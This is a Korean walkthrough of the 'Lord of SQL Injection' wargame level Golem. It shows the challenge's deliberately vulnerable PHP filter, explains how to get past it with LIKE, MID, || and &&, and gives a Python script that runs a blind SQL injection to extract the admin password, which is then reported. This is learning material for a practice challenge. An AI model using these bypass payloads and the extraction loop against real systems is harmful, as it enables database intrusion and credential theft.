# Lord of SQL Injection No.11 Golem

`or`, `and`, `substr()`, `=` 을 사용하지 않고 Blind SQL Injection을 하도록 유도한 문제이다.

## 소스 코드

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe");
```

`preg_match`에서 `or`, `and`, `substr()`을 필터링한 후 `HeHe`를 출력하며 문제 풀이에 실패하게 된다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
```

DB에 있는 `pw` 값과 `$_GET` 방식으로 입력받은 `pw` 값이 일치하면 문제 풀이에 성공한다.

## Solution

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
pwlen = 0

for i in range(1,10):
    url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
    add_url = "' || length(pw) like {} -- ;".format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
        add_url = "' || id like 'admin' && MID(pw,1,{}) like '{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)


        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        request = urllib.request.urlopen(re)

        if str(request.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break
print("Finished Searching.")
print("Password : " + result)
```

Blind SQL Injection을 하기 위해 사용한 Python 코드는 형태가 거의 비슷하기 때문에 이전에 사용했던 코드에서 조금만 수정하면 손쉽게 사용 가능하다.

첫 `for`문에서 `length(pw) like {}` 구문으로 `pw`의 길이를 찾는다. -> pwlen = 8
`like`는 `=` 연산자가 `preg_match` 함수에서 필터링이 되기 떄문에 우회 용도로 사용된다.

#### like

* [SQL LIKE 구문](http://makand.tistory.com/entry/SQL-LIKE-%EA%B5%AC%EB%AC%B8)

두번째 `for`문에서는 `or`, `and` 연산을 우회하기 위해 `||`와 `&&`를 사용하였다.
`&&`는 URL에 직접 대입하면 안되지만, `quote(add_url)`가 실행되면 `URL Encoding`을 수행하기 때문에 서버 상에서는 `%26%26` 상태로 삽입되었다고 볼 수 있다.

모든 `for`문이 끝나면 `pw`값은 `88e3137f` 가 나오게 된다.

```
http://los.eagle-jump.org/golem_***.php?pw=88e3137f
```

URL에 직접 `pw`를 대입하면 DB의 `pw` 값과 일치하게 되어 문제 풀이에 성공하게 된다.